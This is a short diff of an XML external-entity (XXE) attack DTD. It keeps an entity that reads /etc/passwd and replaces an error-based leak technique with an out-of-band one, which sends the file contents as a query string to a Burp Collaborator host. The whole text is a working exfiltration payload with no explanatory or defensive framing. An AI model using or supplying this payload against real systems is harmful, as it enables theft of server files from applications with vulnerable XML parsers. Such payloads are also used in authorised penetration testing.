@@ -1,4 +1,3 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
-%eval;
-%error;
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://rzudgg6q9lm7wck19cqcoxookfqde2.burpcollaborator.net/?%file;'>">
+%all;
